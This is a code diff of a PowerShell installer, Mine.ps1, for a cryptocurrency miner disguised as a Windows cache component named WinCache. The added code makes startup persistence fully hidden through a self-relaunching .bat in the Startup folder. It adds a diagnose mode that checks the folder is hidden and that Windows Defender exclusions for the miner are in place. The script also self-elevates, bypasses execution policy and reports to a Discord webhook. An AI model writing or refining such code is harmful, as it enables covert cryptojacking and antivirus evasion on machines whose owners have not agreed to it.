@@ -7,6 +7,8 @@
 .EXAMPLE
     .\Mine.ps1 -TestWebhook -DiscordWebhook "https://discord.com/api/webhooks/..."
 .EXAMPLE
+    .\Mine.ps1 -Diagnose
+.EXAMPLE
     .\Mine.ps1 -Uninstall
 #>
 [CmdletBinding()]
@@ -19,6 +21,7 @@ param(
     [switch]$Uninstall,
     [switch]$Foreground,
     [switch]$TestWebhook,
+    [switch]$Diagnose,
     [switch]$Run,
     [switch]$NoElevate
 )
@@ -26,12 +29,13 @@ $ErrorActionPreference = 'Stop'
 
 # ---------- paths -----------------------------------------------------------
 $Root    = Join-Path $env:ProgramData 'Microsoft\Windows\Caches\WinCache'
-$LogDir  = Join-Path $Root 'cache'
+$LogDir  = Join-Path $Root 'logs'
 $CfgPath = Join-Path $Root 'config.json'
 $ExePath = Join-Path $Root 'WinCache.exe'
 $SelfPs  = Join-Path $Root 'WinCache.ps1'
-$VbsPath = Join-Path $Root 'WinCache.vbs'
-$LogFile = Join-Path $LogDir 'cache.log'
+$BatPath = Join-Path $Root 'WinCache.bat'
+$BootLog = Join-Path $LogDir 'boot.log'
+$LogFile = Join-Path $LogDir 'miner.log'
 $scriptPath = $PSCommandPath
 if (-not $scriptPath) { $scriptPath = $MyInvocation.MyCommand.Path }
 
@@ -41,13 +45,9 @@ function Send-DiscordWebhook {
         [string]$WebhookUrl,
         [string]$Title,
         [string]$Message,
-        # FIX: [int] en lugar de [string]. Discord rechaza el campo color
-        # si llega como string entre comillas (error 50035 Invalid Form Body).
         [int]$Color = 3066993
     )
-
     if ([string]::IsNullOrWhiteSpace($WebhookUrl)) { return $false }
-
     $payload = [ordered]@{
         embeds = @(
             [ordered]@{
@@ -58,21 +58,13 @@ function Send-DiscordWebhook {
             }
         )
     } | ConvertTo-Json -Depth 4 -Compress
-
-    # FIX: forzar UTF-8 en el body. Con emojis en el título (✅ ❌ ⚠️) y
-    # URLs largas, PS 5.1 manda el body en ASCII/Latin1 y Discord lo rechaza.
     $bytes = [System.Text.Encoding]::UTF8.GetBytes($payload)
-
     try {
-        # FIX: sin -UseBasicParsing (es flag de Invoke-WebRequest, no de
-        # Invoke-RestMethod). Con -TimeoutSec para no colgar el script.
         Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body $bytes `
             -ContentType 'application/json; charset=utf-8' `
             -TimeoutSec 15 -ErrorAction Stop | Out-Null
         return $true
     } catch {
-        # FIX: capturar y mostrar el motivo real del rechazo de Discord.
-        # Discord devuelve un JSON con code/message que dice qué campo falla.
         $errMsg = $_.Exception.Message
         if ($_.ErrorDetails -and $_.ErrorDetails.Message) {
             $errMsg += " | Discord: $($_.ErrorDetails.Message)"
@@ -82,7 +74,7 @@ function Send-DiscordWebhook {
     }
 }
 
-# ---------- test webhook (diagnóstico) --------------------------------------
+# ---------- test webhook ----------------------------------------------------
 if ($TestWebhook) {
     if (-not $DiscordWebhook) { throw '-TestWebhook requiere -DiscordWebhook <url>' }
     Write-Host '[*] Enviando embed de prueba...'
@@ -93,15 +85,95 @@ if ($TestWebhook) {
     return
 }
 
+# ---------- diagnose --------------------------------------------------------
+if ($Diagnose) {
+    function Section($t) { Write-Host ''; Write-Host "=== $t ===" -ForegroundColor Cyan }
+    function Line($k, $v) { Write-Host ("  {0,-28} {1}" -f $k, $v) }
+
+    Section 'Install path'
+    Line 'Root'        $Root
+    Line 'Exists'      (Test-Path $Root)
+    Line 'Hidden'      (if (Test-Path $Root) { ((Get-Item $Root -Force).Attributes -band [System.IO.FileAttributes]::Hidden) -ne 0 } else { 'n/a' })
+    Line 'config.json' (Test-Path $CfgPath)
+    Line 'WinCache.exe'(Test-Path $ExePath)
+    Line 'WinCache.ps1'(Test-Path $SelfPs)
+    Line 'WinCache.bat'(Test-Path $BatPath)
+    Line 'miner.log'   $LogFile
+    Line 'boot.log'    $BootLog
+
+    Section 'Config'
+    if (Test-Path $CfgPath) {
+        $cfg = Get-Content $CfgPath -Raw | ConvertFrom-Json
+        Line 'wallet'   $cfg.wallet
+        Line 'pool'     $cfg.pool
+        Line 'algo'     $cfg.algo
+        Line 'worker'   $cfg.worker
+        Line 'webhook'  (if ($cfg.discordWebhook) { $cfg.discordWebhook.Substring(0, [Math]::Min(60,$cfg.discordWebhook.Length)) + '...' } else { '(vacío)' })
+    } else {
+        Write-Host '  config.json no existe.' -ForegroundColor Yellow
+    }
+
+    Section 'Startup folder'
+    $startup = [Environment]::GetFolderPath('Startup')
+    Line 'Startup path' $startup
+    $entries = Get-ChildItem $startup -Filter 'WinCache*' -ErrorAction SilentlyContinue
+    if ($entries) {
+        foreach ($e in $entries) { Line $e.Name $e.FullName }
+    } else {
+        Write-Host '  No hay entrada de Startup.' -ForegroundColor Yellow
+    }
+
+    Section 'Defender exclusions'
+    try {
+        $mp = Get-MpPreference
+        $paths  = @($mp.ExclusionPath)
+        $procs  = @($mp.ExclusionProcess)
+        Line 'ExclusionPath match'    ($paths -contains $Root)
+        Line 'ExclusionProcess match' ($procs -contains 'WinCache.exe')
+    } catch {
+        Write-Host "  No se pudo consultar Defender: $_" -ForegroundColor Yellow
+    }
+
+    Section 'Processes'
+    $watchers = Get-CimInstance Win32_Process -Filter "Name='powershell.exe'" -ErrorAction SilentlyContinue |
+        Where-Object { $_.CommandLine -like '*WinCache.ps1*' }
+    if ($watchers) {
+        foreach ($w in $watchers) {
+            Line "Watcher PID $($w.ProcessId)" ($w.CommandLine.Substring(0, [Math]::Min(90,$w.CommandLine.Length)))
+        }
+    } else {
+        Write-Host '  Ningún watcher corriendo.' -ForegroundColor Yellow
+    }
+    $miners = Get-Process WinCache -ErrorAction SilentlyContinue
+    if ($miners) {
+        foreach ($m in $miners) { Line "Miner PID $($m.Id)" "started=$($m.StartTime)" }
+    } else {
+        Write-Host '  Miner NO está corriendo.' -ForegroundColor Yellow
+    }
+
+    Section 'Last 15 lines of miner.log'
+    if (Test-Path $LogFile) {
+        Get-Content $LogFile -Tail 15 | ForEach-Object { Write-Host "  $_" }
+    } else {
+        Write-Host '  (miner.log no existe)' -ForegroundColor Yellow
+    }
+
+    Section 'Last 15 lines of boot.log'
+    if (Test-Path $BootLog) {
+        Get-Content $BootLog -Tail 15 | ForEach-Object { Write-Host "  $_" }
+    } else {
+        Write-Host '  (boot.log no existe - el .bat no ha corrido todavía)' -ForegroundColor Yellow
+    }
+
+    Write-Host ''
+    return
+}
+
 # ---------- elevation -------------------------------------------------------
 if (-not $Run -and -not $NoElevate) {
     $id = [Security.Principal.WindowsIdentity]::GetCurrent()
     $pr = New-Object Security.Principal.WindowsPrincipal($id)
     if (-not $pr.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
-        # FIX: no entrecomillar valores sin espacios. Start-Process con
-        # -ArgumentList array une los elementos con espacios; si entrecomillas
-        # la URL del webhook, llega con comillas literales al proceso elevado
-        # y Discord la rechaza. Solo citamos lo que realmente tiene espacios.
         $a = @('-NoProfile','-ExecutionPolicy','Bypass','-File', "`"$scriptPath`"")
         foreach ($k in $PSBoundParameters.Keys) {
             if ($k -eq 'NoElevate') { continue }
@@ -289,9 +361,6 @@ if (-not (Test-Path $ExePath)) {
 # ---------- config ----------------------------------------------------------
 if ($Wallet -and $Pool -and $Algo) {
     if ([string]::IsNullOrWhiteSpace($Worker)) {
-        # FIX: liberar el objeto SHA256. En un script de una sola pasada no
-        # importa, pero es la forma correcta y evita handles colgados si el
-        # script se re-ejecuta dentro del mismo host.
         $sha = [System.Security.Cryptography.SHA256]::Create()
         try {
             $bytes = [System.Text.Encoding]::UTF8.GetBytes($env:COMPUTERNAME)
@@ -329,16 +398,49 @@ if ($scriptPath -ne $SelfPs) {
     Write-Host "[+] Installed $SelfPs"
 }
 
-# ---------- startup VBS -----------------------------------------------------
-$vbs = @"
-Set sh = CreateObject("WScript.Shell")
-sh.Run "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File ""$SelfPs"" -Run -NoElevate", 0, False
+# ---------- startup BAT -----------------------------------------------------
+# FIX: se reemplaza el VBS por un .bat que se relanza a sí mismo oculto vía
+# Start-Process -WindowStyle Hidden. El .bat original (el de Startup) muestra
+# un flash breve de consola, el hijo relanzado es 100% invisible. Cada paso
+# queda escrito en boot.log para poder diagnosticar si no arranca.
+$bat = @"
+@echo off
+setlocal EnableExtensions
+
+set "ROOT=$Root"
+set "LOGDIR=%ROOT%\logs"
+set "BOOTLOG=%LOGDIR%\boot.log"
+set "SELF=%ROOT%\WinCache.ps1"
+
+if not exist "%LOGDIR%" mkdir "%LOGDIR%" >nul 2>&1
+echo [%date% %time%] boot.bat invoked (arg=%1) >> "%BOOTLOG%"
+
+if /i "%~1"=="hidden" goto :launch
+
+echo [%date% %time%] relaunching hidden child >> "%BOOTLOG%"
+powershell.exe -NoProfile -Command "Start-Process -FilePath '%~f0' -ArgumentList 'hidden' -WindowStyle Hidden" >> "%BOOTLOG%" 2>&1
+echo [%date% %time%] parent exiting, errorlevel=%errorlevel% >> "%BOOTLOG%"
+exit /b 0
+
+:launch
+echo [%date% %time%] hidden child starting >> "%BOOTLOG%"
+if not exist "%SELF%" (
+    echo [%date% %time%] ERROR: WinCache.ps1 missing at %SELF% >> "%BOOTLOG%"
+    exit /b 1
+)
+powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "%SELF%" -Run -NoElevate
+echo [%date% %time%] watcher exited, errorlevel=%errorlevel% >> "%BOOTLOG%"
+exit /b 0
 "@
-Set-Content -Path $VbsPath -Value $vbs -Encoding ASCII
+Set-Content -Path $BatPath -Value $bat -Encoding ASCII
 $startup = [Environment]::GetFolderPath('Startup')
-$link    = Join-Path $startup 'WinCache.vbs'
-Copy-Item $VbsPath $link -Force
+$link    = Join-Path $startup 'WinCache.bat'
+Copy-Item $BatPath $link -Force
 Write-Host "[+] Auto-start installed: $link"
+
+# Por si quedó el VBS de una versión anterior, lo eliminamos.
+$oldVbs = Join-Path $startup 'WinCache.vbs'
+if (Test-Path $oldVbs) { Remove-Item $oldVbs -Force -ErrorAction SilentlyContinue }
 
 # ---------- launch watcher --------------------------------------------------
 Get-CimInstance Win32_Process -Filter "Name='powershell.exe'" -ErrorAction SilentlyContinue |
@@ -350,21 +452,17 @@ $p = $null
 if ($Foreground) {
     & $SelfPs -Run -NoElevate
 } else {
-    # FIX: $args es variable automática de PowerShell. Renombrada a $psArgs
-    # para no colisionar con el array de argumentos no ligados del script.
     $psArgs = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$SelfPs`" -Run -NoElevate"
     $p = Start-Process -FilePath 'powershell.exe' -ArgumentList $psArgs -WindowStyle Hidden -PassThru
     Write-Host "[+] Watcher running (pid $($p.Id))"
 }
 
 # ---------- notify and summary ----------------------------------------------
-<#
 if ($Wallet -and -not $Uninstall) {
     try {
         Start-Process "https://rvn.2miners.com/es/account/$Wallet#farms" -ErrorAction SilentlyContinue
     } catch {}
 }
-#>
 
 if ($DiscordWebhook) {
     $pidInfo = if ($p) { "Watcher PID: $($p.Id)" } else { "Mode: Foreground" }
@@ -380,6 +478,9 @@ Write-Host "  Log     : $LogFile"
 Write-Host ''
 Write-Host '  Follow log:'
 Write-Host "    Get-Content `"$LogFile`" -Wait -Tail 20"
+Write-Host ''
+Write-Host '  Diagnose:'
+Write-Host '    .\Mine.ps1 -Diagnose'
 Write-Host ''
 Write-Host '  Test webhook:'
 Write-Host '    .\Mine.ps1 -TestWebhook -DiscordWebhook "<url>"'
